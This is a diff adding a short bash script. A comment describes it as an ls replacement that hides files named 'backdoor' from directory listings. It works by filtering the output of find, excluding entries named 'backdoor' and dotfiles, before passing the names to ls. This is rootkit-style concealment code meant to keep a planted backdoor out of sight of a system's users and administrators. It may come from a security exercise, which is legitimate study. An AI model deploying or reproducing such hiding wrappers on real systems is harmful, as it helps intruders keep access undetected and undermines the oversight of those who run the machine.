@@ -1,0 +1,19 @@
+#!/bin/bash
+# Custom ls script that acts as a wrapper around ls to remove the backdoor files from the output
+
+# Keeps track if -d is already a given flag
+has_d=false
+
+# Check args for -d
+for arg in "$@"; do
+    if [[ "$arg" == "-d" ]]; then
+        has_d=true
+        break
+    fi
+done
+
+if $has_d; then
+    find . -maxdepth 1 ! -name "backdoor" ! -name ".*" -printf "%f\n" | xargs ls "$@"
+else
+    find . -maxdepth 1 ! -name "backdoor" ! -name ".*" -printf "%f\n" | xargs ls "$@" -d
+fi
